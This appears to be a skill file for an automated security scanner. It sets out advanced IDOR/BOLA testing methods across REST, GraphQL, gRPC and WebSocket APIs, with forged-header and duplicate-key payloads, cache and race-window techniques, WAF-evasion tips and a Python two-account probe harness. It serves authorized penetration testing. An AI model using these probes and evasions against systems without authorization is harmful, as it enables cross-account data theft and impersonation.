---
name: idor-advanced-deep
description: Advanced IDOR/BOLA depth — parser/router/serializer differentials that lose identity, blind-channel confirmation past status codes, cache-layer and race-window exploitation, and adversarial two-account differential methodology across REST/GraphQL/gRPC/WebSocket
sibling: idor
load_when: scan_mode == "deep"
---

# IDOR — Advanced Deep

Load `idor` for base-tier framing (the six-family BOLA taxonomy, canonical two-account differential, framework-default ID-predictability measurements, and the three-clause confirmation predicate). Load `idor_novel_deep` for the 2024–2026 empirical research, canonical version metadata, and frontier stacks. This file owns the advanced/expert layer between them: the layer-by-layer differentials that make identity misbind, the blind-channel confirmation methodology that survives silent-enforcement fixes, cache-layer and race-window primitives, and the adversarial-mode two-account probe against evasive endpoints.

## Identity Loss Across the Request Stack

Every request that reaches an object handler passes through a chain of layers — TLS terminator, reverse proxy, gateway, load balancer, service framework, middleware pipeline, resolver, ORM. Each layer can decide, override, or drop identity. The finding is often not "authorization is missing" but "authorization is decided at the *wrong layer* against the *wrong identity*." The probe is a series of differentials, each aimed at one layer:

### Reverse-Proxy Identity Rewriting

- **Header stripping vs preservation**: send the request with `X-User-Id: <victim>` in addition to a valid `Authorization: Bearer …` for the attacker. If the proxy strips attacker-supplied identity headers, the app receives only the token's identity. If it forwards them, the app now has two conflicting sources of identity — send them intentionally contradictory and see which the app trusts. A backend that trusts the header over the token is a full impersonation primitive.
- **Header injection via absent boundary**: some proxies inject `X-Forwarded-User: <sub>` from the JWT `sub` claim without stripping a client-sent `X-Forwarded-User`. Send with an empty token *and* a forged header; if the app trusts the header alone, the token layer is bypassed entirely.
- **Trailing-header confusion**: HTTP/1.1 chunked-transfer trailers may carry headers that the proxy validates but the backend sees before them. In some setups, an `X-Original-User` in a trailer arrives after the proxy has already made its authorization decision. Combine with request smuggling for the full primitive (load `http_request_smuggling`).
- **Case normalization**: `X-Tenant-ID` vs `x-tenant-id` vs `X-Tenant-Id` — a proxy that only checks the canonical case forwards the alternate case unchanged, and the backend reads either. Send both with contradictory values.

### Gateway/Service Mesh Boundary

- **mTLS-terminated identity**: service mesh (Istio, Linkerd, Consul) often carries identity in a signed `X-Forwarded-Client-Cert` or a proprietary header derived from the peer mTLS cert. If a client can reach the mesh's ingress with a raw-HTTP call bypassing mTLS, the injected identity claims may or may not be present — the target's behavior when they are absent is the finding.
- **JWT re-signing at gateway**: a gateway that validates the client JWT and issues an *internal* JWT with expanded claims is a trust-boundary shift. Probes: send the internal-shape JWT directly (if the internal port is reachable); tamper the outer JWT to see whether the gateway re-signs blindly (bearer chain).
- **Service-to-service call context loss**: when service A calls service B on behalf of a user, does B re-check the user or trust A? A background job / queue consumer that reads a message with an embedded `userId` and never re-authorizes is the classic "context loss" primitive. Probe: submit a message with a foreign `userId` and confirm the consumer processes it under service credentials, not user context.

### Framework Middleware Order

The middleware order decides whether identity survives to the handler. Reordering primitives:

- **Middleware before router**: if authentication runs before routing, the router sees an authenticated context. If routing runs first (as in some path-based route dispatchers), a path with weird characters (`/api/orders/../users/{id}`) may skip the auth stage entirely. Probe every path-normalizer differential (`.` `..` `%2f` `%00` `\` in path segments; a normalizer that runs after auth is a bypass).
- **Middleware exemptions**: `EXEMPT_URLS`, `csrf_exempt`, `permission_classes = []`, `@Anonymous` decorators. A handler that opts out of one middleware layer may inherit an inconsistency with its neighbours. Grep the codebase; treat each exemption as a candidate.
- **Async middleware race**: async frameworks (FastAPI, Starlette, ASGI) may execute middleware concurrently on the same request in some edge modes. Two middlewares racing on the same `request.state` slot can produce indeterminate identity. Probe by measuring under load.

### Body Parsing and Serialization Drift

The body parser and the ORM see two different versions of the request. Any disagreement is a bypass:

- **Duplicate keys in JSON**: RFC 8259 leaves duplicate-key handling undefined; Go's `encoding/json`, Python's `json`, Node's `JSON.parse`, and Java's Jackson each pick different resolution rules. Send `{"user_id":<mine>,"user_id":<victim>}` — the middleware that authorizes on the first occurrence and the ORM that reads the last is a bypass.
- **Array-vs-scalar coercion**: `{"user_id":[<mine>,<victim>]}` — a schema that expects a scalar may take the first, a schema that expects an array may take the second. Probe both shapes.
- **String-vs-int coercion**: `{"user_id":"123"}` vs `{"user_id":123}`. A JSON parser that keeps strings verbatim reaches an ORM that parses to int; the intermediate may sanitize or truncate. Try leading zeros, hex prefixes (`0x7b`), and scientific notation (`1.23e2`).
- **Nested-body override**: `{"user_id":<mine>,"nested":{"user_id":<victim>}}` — an ORM's `.update(**request.body)` sometimes flattens the nested key over the top-level. Probe every write endpoint.
- **YAML deserializers over JSON media type**: some frameworks accept `application/yaml` on the same endpoint as `application/json`. YAML permits anchors, references, and type coercion that JSON does not — a `!!python/tuple` or `&anchor` reference may reach an object graph the JSON parser rejects. Load `insecure_deserialization` for the deserialization angle; the IDOR relevance is that the middleware parses JSON but the framework accepts YAML and reaches a different ownership check.

### ORM/Query Layer Identity Drift

- **Tenant scoping decorators**: `TenantScopedManager`, Django's `.filter(tenant=self.request.user.tenant)`, Rails's `default_scope`, Ecto's `Repo.get_by`. These conventions assume the framework has already populated the current-tenant. A background job, a management command, or a data-repair route that runs the same query under a service-user context loses the tenant filter. Probe by inducing the endpoint into a code path that lacks the request context.
- **Raw-SQL/QueryBuilder escape hatches**: `Order.execute(raw_sql, ...)` skips the ORM's scoping. Any endpoint that composes a WHERE clause manually re-opens the IDOR surface. Grep for raw-query patterns and re-check the tenant filter is manually present.
- **Row-level security bypass at superuser**: DB-level RLS (Postgres RLS, MySQL RLS extensions) filters rows based on a session-variable that must be set per request. A worker that opens a superuser connection with `SET SESSION AUTHORIZATION` reset misses the filter entirely.

## Second-Order and Stored IDOR

The two-account differential is a live-request probe. Second-order IDOR fires later, from a stored value the app processes under a different identity context.

- **Stored identifier consumption**: write a foreign object ID into a field that a background job dereferences (`webhook_url`, `linked_order_id`, `merged_from_id`). The job runs under service context; if it re-fetches without re-authorizing, the primitive is now IDOR from your stored payload. Load the base file's Object Rebinding for the write-side; the second-order angle is that the read happens later, outside your session.
- **Import/export chain**: upload a CSV/JSON with foreign FKs (`{"invoice_id": <victim>, ...}`). The importer resolves references — if it does so under the importer's service account rather than the caller, foreign objects are dereferenced.
- **Email/template rendering**: template engines that interpolate object references (`{{order.customer.email}}`) resolve them at render time under the mail-service identity, not the caller. Store an object with a `customer_id` pointing at a foreign user; the confirmation email delivers that user's PII to your inbox.
- **Search-index cache**: full-text indices (Elastic, Meili, OpenSearch) get re-indexed under a service identity. A write that stores a foreign FK ends up in the index and can be queried back cross-tenant.

The stored-IDOR probe has three phases: (1) write the trigger, (2) wait for or force the async consumption, (3) observe the delayed leak in a channel you control (inbox, notification, log surface). Timeboxing matters — a probe that fires immediately and sees nothing is not a negative.

## Blind-Channel Confirmation Methodology

When the response body is masked, empty, or intentionally obfuscated, confirmation has to come from the response's shape:

### Existence Oracles

- **Status-code differential**: 200 vs 403 vs 404 for owned vs foreign. Some apps deliberately return 404 for both to avoid leakage — probe with a definitely-nonexistent ID (`0`, `-1`, `9999999999`) to establish the "does not exist" baseline; the "exists but foreign" response often differs subtly.
- **Response-size differential**: even a 403 may vary in body size across "not authorized to view this specific record" vs "no such record." A single-byte difference in error JSON is often the oracle (`{"error":"forbidden"}` vs `{"error":"not_found"}`).
- **Header differential**: `ETag`, `Last-Modified`, `X-Request-Id` — some apps compute headers before authorization and leak them. An `ETag` present on foreign IDs but absent on nonexistent ones is an existence oracle.
- **HEAD/OPTIONS response**: HEAD often skips body but leaks Content-Length, ETag, Last-Modified. OPTIONS may expose the `Allow` list per resource — an object with `Allow: GET, PUT, DELETE` exists; one with the middleware's default `Allow: GET` may not.
- **Conditional-request differential**: `If-None-Match: <known-etag>` returns 304 for a matching resource — if the app computes the etag and the etag matches, the resource exists. Chain: guess an etag shape (`W/"<hash>"`), fire conditional requests across the ID space, and confirm existence without seeing content.

### Timing Oracles

- **DB-hit vs middleware-reject**: a request that reaches the DB takes longer than one rejected at the auth layer. Under moderate load, the difference is measurable (10ms vs 1ms typical). Batch the probe (hundreds of requests) and use the median, not a single measurement.
- **Cache-vs-origin**: a first request to a foreign ID may hit the origin (slower); a repeat hits cache. The first-response timing differential across a range of IDs, correlated with subsequent responses' cache headers, distinguishes "exists but not fetched" from "does not exist."
- **Coarse timer under noise**: JavaScript's `performance.now()` and cross-origin timing side channels round to ms; use them for coarse but noise-tolerant existence tests when direct HTTP is blocked.

### Error-Text Fingerprints

- **Traceback fingerprint**: verbose error pages sometimes leak the stack trace; a `MODEL_DoesNotExist` vs `PermissionDenied` distinguishes existence from authorization. Trigger errors intentionally to fingerprint the exception class.
- **Structured error codes**: `{"error_code": "AUTHZ_DENIED"}` vs `{"error_code": "RESOURCE_NOT_FOUND"}` is a plain existence oracle. Log error codes across a probe range and count distinct codes.

### Side-Channel via Related Endpoints

- **Search endpoints**: a query for `id:{foreign}` on a full-text index may return metadata (title, timestamp) even when the direct `GET /orders/{foreign}` is blocked.
- **Audit/activity logs**: an activity feed that mentions `Order #foreign` in a peer's context is an oracle; probe the peer's audit endpoint.
- **Notification recipients**: subscribing to a channel like `user.{foreign}.notifications` and receiving events is existence confirmation.
- **Aggregate endpoints**: a report or dashboard that includes `count(orders where owner_id = {foreign})` reveals existence via the count.

The false-positive discipline for blind channels is: any single differential can be an implementation detail. Confirm the *shape* of the differential holds across the ID space, not the value at one point.

## Cache-Layer IDOR

Caches interact with authorization in three failure modes: cache-key omission, cache-poisoning, and cache-key smuggling.

### Cache-Key Omission

- **URL-only keying**: a CDN that keys on `URL + Vary headers` without including `Authorization` or `Cookie` serves the first user's response to the second. Confirm by fetching `/api/me` under user A (populates cache), then under user B without their cookie (returns A's data).
- **Vary header manipulation**: send `Vary: X-Requested-With` in a response you can influence (a webhook response, a redirect target). Some caches respect the `Vary` from the origin's *response* but not from the request; the cached entry now shares across users who differ only in that header.
- **Cache-Control abuse**: `Cache-Control: public, max-age=3600` on a per-user response leaks it into shared caches. Probe: check response Cache-Control on user-scoped endpoints; any `public` on a user-tied resource is a candidate.
- **Cache-key partitioning at proxy**: some proxies partition by TLS session or by client-cert fingerprint but not by app identity. A single TLS session (attacker's connection) serving multiple app sessions can reach shared cache slots.

### Cache Poisoning

- **Reflected-header poisoning**: the response includes a header value from the request (`X-Forwarded-Host`, `X-Original-URL`). A cache that keys on the URL but ignores the poisoning input caches the poisoned response and serves it to victims.
- **Content negotiation via unkeyed headers**: `Accept-Language`, `Accept-Encoding`, `User-Agent` — some routes select content by these but do not include them in the cache key. Poison one variant and the shared cache serves it to users whose request headers match.
- **Response-split under `X-HTTP-Method-Override`**: a proxy that treats the raw method as GET and caches the response, but the app treats the override method as POST (which mutates), gets a cached mutation-effect response served on subsequent GETs.

### Cache-Key Smuggling

- **Parameter cloaking**: `GET /orders/1?utm_source=x` and `GET /orders/1` may have different cache keys but reach the same handler. Under authorization drift, the parameter-cloaked variant serves cached foreign data.
- **Path segment normalization drift**: `GET /orders/1/` and `GET /orders/1` — one may be cached and the other not; one may skip auth normalization and the other not.

The IDOR-in-cache probe is a peer-account differential: user A fetches a resource, user B fetches the same URL, and the response leaks A's content. It is distinct from cache-poisoning-to-XSS (a different impact class); the impact here is cross-account read.

## Race-Window Exploitation

Ownership checks and state changes execute in sequence; a race collapses the sequence.

### Time-of-Check vs Time-of-Use

- **Ownership check before mutation**: `SELECT owner FROM orders WHERE id = ?; if owner == request.user: UPDATE orders SET x = ? WHERE id = ?` — two SQL statements with a window in between. Change the ID's owner in the window and the mutation lands on the foreign owner. Sometimes possible via a self-transfer race: transfer object to yourself, mutate, transfer back.
- **Signed-URL TTL race**: a presigned URL valid for 5 minutes generated on the caller's behalf but not tied to the caller's ongoing session — the caller expires or logs out, the URL remains valid, and it lands in shared logs / mirrors.
- **Cache-invalidation race**: mutation invalidates the caller's cache; a peer request in the window sees stale data. If the stale data is the *previous owner's*, it is disclosure.

### Concurrent Session Swap

- **Session-transfer race**: log in as A, initiate a long-running request, in parallel log in as B on the same browser, and the request completes carrying A's session but processed under B's context. Test the framework's session-store semantics (cookie-based, DB-backed, Redis-backed) — DB-backed sessions with lazy fetch are prone to this.
- **Token-refresh mid-request**: OAuth refresh happens between authorization decision and business logic, and the new token has different claims. Manipulate the refresh timing.

### TOCTOU on Enrolment/Transfer

- **Add-then-remove race**: adding a member to a group grants access; removing them after re-adds under a stale check. Test whether concurrent add/remove yields inconsistent state.
- **Ownership-transfer race**: `POST /objects/{id}/transfer` under high concurrency may leave the object with two owners for a window; both can act during the window.

Race exploitation for IDOR requires a request-primitive amplifier — parallel HTTP with `curl --parallel-immediate`, `hurl` `--parallel`, `Turbo Intruder` (Burp), or `Race the Web`. The primitive is not a scanner mode; it is a hand-crafted concurrency probe.

## GraphQL Advanced

The base file covers Relay `node(id:)` and cursor manipulation. Deeper primitives:

### Persisted-Query Drift

- **Persisted-query hash tampering**: apps that use `Apollo Persisted Queries` or `Automatic Persisted Queries` map a SHA-256 hash to a query text; the client sends the hash. If the server's cache is unbounded, a client can register a new hash by first sending the query text and hash; then re-send the hash alone. If the persisted-query layer runs *before* authorization (some caching CDNs do), the auth layer receives only the hash and cannot inspect the query — a persisted query for `user(id:{ANY}){email}` becomes an authorization-free enumeration primitive.
- **Extension manipulation**: `extensions.persistedQuery.version`, `extensions.persistedQuery.sha256Hash` — tamper the extension shape to induce the middleware to fall through to a permissive default.

### Batching and Aliases

- **Deep alias abuse**: a single request with 100 aliases (`u1: user(id:1) { email } u2: user(id:2) { email } ...`) may bypass rate-limiting scoped per-request and depth-limited per-alias. Probe the alias-count ceiling.
- **Fragment-based overfetch**: `... on PrivilegedType { field }` on a shared parent (a union type or an interface) forces the resolver into a code path the schema documents but the authorization layer does not check.
- **Recursive fragment**: `fragment F on User { friends { ...F } }` at unbounded depth. If the app defends via query-depth limit, probe alternative traversals (introspection, deep union types).

### DataLoader Cache Poisoning

DataLoader-style batching (Facebook's dataloader library, similar patterns in other GraphQL frameworks) memoizes resolved objects per-request context. If the memoization key is `id` without a tenant/user scope, two concurrent resolutions in the same request that share an `id` share the result. A request that includes both an owned `user(id:1)` and an unowned `user(id:1)` may see the second inherit the first's authorization check.

- **Cross-tenant dataloader poisoning**: in multi-tenant apps where the dataloader's key is `id`, a query touching both tenants in the same GraphQL operation may see one tenant's authorization decision applied to the other. Probe: construct a query that references the same numeric ID in two tenants' contexts (via aliases) and observe.

### Apollo Federation `_entities`

- **`_entities` under Federation**: the `_entities` field is a gateway-only field that resolves references from other subgraphs. A subgraph implementing an entity resolver often skips end-user authorization on the assumption that the gateway did it. A direct call to `_entities` with an attacker-supplied `representations` array may reach that resolver directly:
  ```graphql
  {
    _entities(representations: [{__typename: "User", id: "<foreign>"}]) {
      ... on User { email billing { last4 } }
    }
  }
  ```
- If the subgraph exposes an unauthenticated port for gateway calls (common in mesh deployments), the primitive is trivial cross-user read. If it is behind mTLS, the primitive requires reaching the mesh (chain with SSRF).

### Introspection-Derived Attack Graph

Introspection returns the full schema. Beyond finding fields, use it to build an attack graph: map every field to (a) whether it takes an id-shaped argument, (b) whether it returns a user-scoped type, (c) whether it is a mutation. The intersection of (a) and (b) is the IDOR-probe frontier; (c) at (a) is the Object Rebinding frontier. A quick script that emits this table from an introspection response is far faster than clicking through Playground.

### Fragment-Based Overfetch

- **Interface fragments**: `... on PrivilegedUser { hashed_password }` on a `User` interface. If `PrivilegedUser` is a subtype the schema declares but the app doesn't expect exposed to lower-privilege callers, the fragment reaches those fields.
- **Recursive fragments with depth limit bypass**: `fragment F on X { child { ...F } }` — apps often defend via a static depth limit. Circumvent by expressing the recursion via aliases (`a: child { b: child { c: child { ... } } }`) which flatten to non-recursive syntax.
- **`@include` and `@skip` directives**: `@include(if: $priv)` where `$priv` is caller-controlled — normally the directive is server-parsed; some servers execute the resolver regardless and merely filter output at the directive stage. The resolver runs and side-effects occur.

### Query Cost Analysis Bypass

- Cost analyzers assign a cost to fields based on complexity. Circumvent by requesting many low-cost fields on privileged types; the total cost stays under budget but the exposure is high.
- Query batching to spread cost across an array of low-cost queries that each pass individual budget but collectively reach the same objects.

### Custom Directive Injection

- **`@auth(role: "admin")` directive as a decoration only**: the directive is documentation, not enforcement — some frameworks require explicit resolver wiring. Removing the directive from the query (server-parsed) may skip the check.
- **`@deprecated` fields**: deprecated fields are usually still served. Adversary reads them.

## gRPC Advanced

Base-file gRPC coverage introduces per-RPC metadata and reflection. Deeper primitives:

### Interceptor-vs-Method Enforcement Drift

- **Unary vs streaming**: an interceptor that authorizes at stream-open does not re-authorize per-message. A bidirectional stream where the client sends `{"action":"read","id":<my>}` first (permitted) then `{"action":"read","id":<foreign>}` on the same stream (should be denied but is not).
- **Per-method interceptor allowlist**: `authInterceptor` may have per-method exceptions; the exempted methods often include health-check and reflection, but sometimes legacy methods. Enumerate the exempt set from the interceptor's source or config.
- **Transcoded HTTP vs native gRPC**: `grpc-gateway`/`envoy` transcode HTTP-JSON to gRPC. The HTTP-side authz middleware and the gRPC-side interceptor are separate code paths; test the same method both ways.

### Metadata Precedence

- **Duplicate metadata keys**: gRPC metadata is a multimap. Send `authorization: Bearer <valid>` alongside `authorization: Bearer <invalid>`; some implementations pick first, others last. Same primitive as HTTP header duplication.
- **Case-insensitive but binary-suffixed**: `-bin` suffix on a metadata key denotes binary value. A key of `authorization-bin` treated as base64 by the interceptor but read as raw by the method is a differential.

### Reflection Discipline

- **Reflection-off ≠ safe**: even with reflection disabled, the `.proto` files ship in the client bundle. Enumerate methods by class name from `grpc.pb.go` / `.js` / `Grpc.d.ts` symbols in the client, then call by fully-qualified name.
- **Health-check probing**: `grpc.health.v1.Health/Check` is often unauthenticated and returns per-service status; enumerating services this way is a lower-noise alternative to reflection.

### Interceptor Escape and Streaming Drift

- **`GRPC_ARG_MAX_METADATA_SIZE`**: exceeding the metadata size may bypass some interceptors that fail-open on parse errors.
- **`grpc-timeout` header manipulation**: setting an extreme timeout may cause the interceptor to skip.
- **Bidirectional streaming abandon**: open a bidi stream, send first request through the interceptor's happy path, then send subsequent messages that the interceptor might not re-authorize per-message.
- **Client-streaming**: a client-streaming RPC accepts many messages before responding. If auth is done at open + first-message but not per-message, subsequent messages can carry foreign IDs.
- **Error-code oracle**: gRPC error codes are structured (`NOT_FOUND`, `PERMISSION_DENIED`, `UNAUTHENTICATED`, `INVALID_ARGUMENT`). Each may be emitted for different underlying reasons; enumerate and use as oracle.

## WebSocket Advanced

- **Topic-name fingerprinting**: for named channels (Pusher, Ably, Phoenix Channels, Socket.io rooms), the channel-name convention is discoverable from the client bundle. Given `user.{userId}.notifications`, iterate `userId` in `SUBSCRIBE` frames and observe ACK vs error frames.
- **Message-level authz drift**: a channel that authorizes subscription-time but not per-message allows an attacker who joined a personal channel to inject `{"action":"delete","targetId":<foreign>}` payloads. The handler often reads the payload's target rather than the channel binding.
- **Broadcast leakage**: multi-user broadcasts (chat rooms, live-updates) may fan-out to subscribers without per-subscriber filtering. Subscribe under a low-privilege account and observe broadcasts intended for admin subscribers.
- **Presence protocols**: presence channels expose lists of subscribers; an admin-only channel may leak the admin roster to an unauthorized subscriber under buggy presence emission.

## Multi-Tenant Boundary Bypass Classes

The base file introduces Tenant Isolation as one of the six families. Advanced primitives:

### Selector Precedence Ambiguity

- **Header vs subdomain vs path**: three selectors carry tenant identity. Send all three intentionally contradictory:
  ```
  Host: tenant-a.app.tld
  X-Tenant-ID: tenant-b
  GET /orgs/tenant-c/orders/1
  Authorization: Bearer <token-for-tenant-d>
  ```
  Each layer picks one; the differential is where they disagree. The finding is the tenant the resource actually belongs to versus the caller's token.
- **Trailing-slash sensitivity**: `Host: {tenant}.app.tld/` on some reverse proxies is treated as a path; the tenant selector then contains a slash that reaches the app as text.

### Cross-Tenant Storage/DB

- **Shared database with tenant column**: the tenant filter is enforced in the app, not at the DB. Any raw query or admin tool that skips the filter reads across tenants.
- **Shared object storage bucket**: a single S3 bucket with tenant-scoped key prefixes (`tenants/{tenantId}/attachments/`) — a key-listing API leak or a signed URL with an over-broad prefix crosses tenants.
- **Shared cache/queue**: Redis, Kafka, RabbitMQ instances shared across tenants with topic/key prefixes as the boundary — a config mistake in the tenant prefix (empty string, wildcard, missing `/`) merges tenants.

### Analytics/Report Rollups

- **Aggregate endpoints**: dashboard endpoints that count/sum across a tenant filter — if the filter is optional, `GET /analytics/orders` with the filter omitted returns global counts. Even without the raw records, the aggregate is disclosure.
- **Search across tenants**: search endpoints that hit a shared index without tenant-restricting the query. The elastic query DSL specifically must include a `filter` on `tenant_id`; without it, all tenants return in results.

### Impersonation Endpoints

- **Support-agent impersonate**: `POST /support/impersonate/{userId}` for support staff — if the check is only on staff, an IDOR-shape `userId` swap under a compromised staff account is any-user impersonation. Chain: BFLA on the impersonate endpoint + IDOR on the target.
- **`impersonated_user_id` in a token**: some apps issue tokens with an embedded impersonation claim; tampering the claim (JWT signing key issues) or the claim's target is a full IDOR primitive.

## Adversarial Two-Account Differential Methodology

The base file describes the two-account probe. The advanced discipline:

### Sound Ground Truth

- **Owner-side capture must precede attacker-side**: fetch the owner's view first, capture the exact response body (or a canonical excerpt), then fire the attacker probe. Cross-checking against a *predicted* body shape rather than the *observed* one is where confirmation-predicate false positives hide.
- **Freshness of ground truth**: for time-varying resources, capture the owner's view immediately before the attacker probe. A stale capture yields a false negative if the resource changed in between.

### Confirming Non-Findings

- **Genuine 404 vs auto-scoped 200**: if the attacker probe returns 200 with a body that *does not* match the owner's ground truth, the app is auto-scoping (silently coercing the request to a permitted resource). Not a finding — but the auto-scoping itself may be a design smell. Confirm by checking whether the returned resource is the attacker's own by any similar shape.
- **Silent 200-empty**: an empty body under 200 for a foreign ID is a silent-enforcement pattern. Confirm the attacker's own resource returns non-empty under the same request shape to rule out "endpoint doesn't work at all."

### Two-Vector Matrix

- **(token, selector) matrix**: for tenant-scoped endpoints, tabulate every combination of (my-token, my-selector), (my-token, foreign-selector), (foreign-token, my-selector), (foreign-token, foreign-selector). The interior cells surface the disagreements between token-scoped auth and selector-scoped auth. A single-vector test that only swaps the token misses selector-derived tenant bugs.
- **Three-account matrix**: many apps enforce differently for role A ≠ role B ≠ unauthenticated. The three-column probe (owner, peer, unauth) discriminates between missing auth and wrong-role auth.

### Volume and Rate Considerations

- **Rate-limited probes**: authz probes at scale trigger rate limiters. Space probes with jitter; run in parallel across identities each within its own quota; use `retry-after` headers as a signal, not a stop condition.
- **Load-based state changes**: some apps escalate protections under load (invalidate all sessions, force re-login). A probe that fires 10k times in a minute may induce protections that mask the finding on the next test cycle.

### Concrete Harness

A working harness (Python for clarity, but any HTTP client suffices):

```python
import httpx, hashlib

def probe(base, owner_token, attacker_token, endpoint, ground_truth_id):
    with httpx.Client(base_url=base, timeout=10) as c:
        # 1. Ground truth: owner reads their own resource
        r_owner = c.get(endpoint, headers={"Authorization": f"Bearer {owner_token}"})
        assert r_owner.status_code < 300, f"ground truth failed: {r_owner.status_code}"
        owner_body = r_owner.json()
        owner_id = owner_body.get("id")
        owner_content_hash = hashlib.sha256(r_owner.content).hexdigest()

        # 2. Attacker probe: same endpoint under attacker's token
        r_atk = c.get(endpoint, headers={"Authorization": f"Bearer {attacker_token}"})

        # 3. Three-clause predicate
        clauses = {
            "status_2xx": r_atk.status_code < 300,
            "identifier_match": r_atk.status_code < 300 and r_atk.json().get("id") == owner_id == ground_truth_id,
            "content_match": r_atk.status_code < 300 and hashlib.sha256(r_atk.content).hexdigest() == owner_content_hash,
        }

    if all(clauses.values()):
        return "CONFIRMED", clauses
    if clauses["status_2xx"] and not clauses["content_match"]:
        return "AUTO_SCOPED_OR_ECHO", clauses  # 200 but different content — silent enforcement or coercion
    if not clauses["status_2xx"]:
        return "ENFORCED", clauses
    return "PARTIAL", clauses
```

Two-clause weakness modes to watch for:

- If the endpoint returns a header (e.g. `X-Object-Owner`) reflecting the true owner, cross-check that too — some silent-enforcement designs return 200 with only the caller's own data but leak the requested object's owner in a metadata header. That header alone is disclosure.
- If the endpoint intentionally hashes IDs into opaque tokens on response (defensive), the identifier-match clause fails on shape mismatch. Compare the *un-hashed* value (from ground truth) against the response's dereferenced content.

## Blind IDOR Under Modern WAFs

- **Positive-model WAFs**: allow only known good; unknown shapes are blocked. Craft probes as syntactic siblings of documented good requests (same header set, same body shape, differing only in the `id` field).
- **ML-model WAFs**: score each request; anomalous request-token flow is flagged. Vary probe cadence, User-Agent, TLS fingerprint (JA3/JA4).
- **Rate + shape combined**: some WAFs block "same shape at high rate"; slow the probe rate; alternate between multiple identities' request shapes to look like organic traffic.

## Confirmation Predicate Under Evasive and Structured Endpoints

The three-clause predicate (status + body-identifier + body-content vs ground truth) needs adjustment when the endpoint intentionally masks or when the body format is not a plain JSON envelope. Two categories:

### Evasive Endpoints

- **Redirect endpoints**: 302 with `Location: /my/dashboard` for foreign ID is silent enforcement (redirect to the caller's scope). Compare Location for owned vs foreign IDs; if the URL differs, it is an oracle.
- **Streaming endpoints**: Server-Sent Events or chunked responses stream data. The confirmation is per-frame — the first frame carries the identifier; each subsequent frame's content is compared.
- **Encrypted responses**: some endpoints encrypt the response body with a per-user key (rare but real). The confirmation is over the encrypted body's *size* and the header set; content-level cross-check is impossible without the key.

### Structured-Data Body Formats

- **CSV / TSV responses**: extract the first-row header, second-row data, and hash. Same three-clause predicate but structured over the first data row.
- **PDF responses**: parse the PDF, extract text and metadata; compare owner vs attacker views. `pdfinfo`, `pdftotext`, `pdfid` are useful.
- **ZIP / TAR archives**: list entries, hash by name+size. If the archive is streamed, extract on the fly.
- **Sqlite dumps**: some exports are `.sqlite` files; open with the `sqlite3` CLI and extract the same identifier from the export.
- **`.parquet` / `.avro` / `.arrow`**: schema-aware; extract identifier fields via `pyarrow`, `duckdb`. Postgres COPY-format exports (distinct from RFC 4180 CSV) use tab-separated with escape sequences — parse via `psycopg2.copy_expert` or a manual COPY-format decoder.

## Signed-URL and Presigned-Storage Primitives

Cloud object storage (S3, GCS, Azure Blob, R2) ships signed URLs as a first-class primitive; each is a per-request delegation of read/write authority. IDOR here operates on the signature's binding to the resource:

### Signature-Path Binding Weaknesses

- **Path substitution under proxy re-sign**: some app proxies validate the request against an internal ACL and *re-sign* upstream to S3. If the proxy's re-sign uses the request URL rather than the pre-validated resource ID, an attacker who supplies a foreign S3 key in the request line (`GET /storage/foreign_key`) reaches the object with a fresh valid signature. Confirm by capturing the outbound signed URL the proxy generates and comparing the resource path.
- **Query-parameter smuggling**: append `?response-content-disposition=attachment&response-content-type=text/plain` to alter the response headers of a foreign object. The signature covers the *bare path*; some implementations do not include these overrides in the signature's canonical string. Probe every response-* override permitted by the S3/GCS API and check whether the signature validates.
- **Version-parameter abuse**: `?versionId=<foreign-version>` on a versioned bucket reaches historical object revisions. If versioning is enabled and old versions were not deleted, an outdated signed URL may reach a stale (potentially foreign) object.
- **Suffix mismatch**: a signature computed over `orders/1.pdf` may still validate for `orders/1.pdf.bak` under some canonicalization edge cases (URL-encoding, unicode normalization). Fuzz the suffix.

### Signature TTL and Reuse

- **Expired-signature acceptance**: some proxies check TTL server-side but the underlying storage does not enforce it (or vice versa). A signed URL from your view that is still fresh at storage-layer TTL despite being "expired" at proxy TTL crosses the tenant if the storage-layer identity is service-level.
- **Signature reuse across resources**: signatures rely on a canonical string that includes the resource path; a signature generated for `orders/1` should not validate for `orders/2`. But some proxies compute a *summary hash* server-side and reuse it — try repeating your own signature against a foreign resource path.

### Bucket-Structure Enumeration

- **`?list-type=2&prefix=` API**: with any read permission on the bucket, list keys by prefix; enumerate tenant prefixes (`tenants/`, `orgs/`, `users/`).
- **Content-Delivery-Network mirror**: some buckets are fronted by a CDN whose `?comp=list` endpoint or directory-listing behavior leaks the key namespace regardless of bucket-level ACL.
- **`.well-known` and manifest paths**: static hosts often expose `sitemap.xml`, `robots.txt`, `.well-known/security.txt` — enumerable directory listings there sometimes point at bucket-scoped export URLs that carry IDs in their filenames (`orders-2026-Q3-{tenantId}.csv.gz`).

The signed-URL IDOR probe is a two-step: (1) capture a legitimate signed URL under your own identity; (2) mutate any of (path, version, headers, TTL, canonical query) and observe whether the storage layer still returns the resource. Load `cloud/aws` for AWS-specific storage semantics; the IDOR angle is the signature's binding, not the credential.

## HTTP-Level Primitives

The HTTP spec allows several primitives that middleware often does not treat with the same authorization discipline as the primary GET/POST paths.

### Range Requests

- `Range: bytes=0-0` on a foreign resource — a 206 confirms existence; the returned byte(s) may leak the file's structure (magic bytes, header fields).
- `Range: bytes=` with a suffix range (`bytes=-100`) reaches the last 100 bytes; PDF trailer, ZIP central directory, sqlite page-header — the tail of a file leaks metadata that the body-view does not.
- Multi-part range: `Range: bytes=0-0,100-100` returns `multipart/byteranges` with the byte pairs. Some middleware authorizes the request but the body-serving layer streams the raw file without re-checking. Probe with adversarial ranges to piece together a foreign file across ranges each of which appears "small enough to be safe."

### Conditional Requests

- `If-None-Match: <known-etag>` — 304 for a matching ETag confirms the resource matches the guessed hash. If ETags are `W/"<sha256-prefix>"` or similar, precompute against a known-content wordlist to fingerprint the file.
- `If-Modified-Since: <past>` — 304 confirms the resource has not been modified since the timestamp; a walk of foreign IDs with a fixed timestamp yields a monotonic existence oracle.
- `If-Match: <foreign-etag>` on a write — if you can guess an ETag for a foreign resource (from another endpoint's response), send a conditional PUT/PATCH; a 412 vs 200 differential distinguishes "your write failed because you don't have write access" from "your write failed because the resource is not the version you thought." Both are oracles.

### Redirection and Absolute-URL Primitives

- **Same-origin redirect target**: an endpoint that redirects to `/user/{id}/profile` under 302 based on your identity — swap the ID and follow the redirect; if the target resource is served directly, it is IDOR.
- **Absolute-URL echoes**: response headers containing echoed URLs (`Link:`, `Content-Location:`, `Refresh:`) sometimes leak internal paths or identifiers.
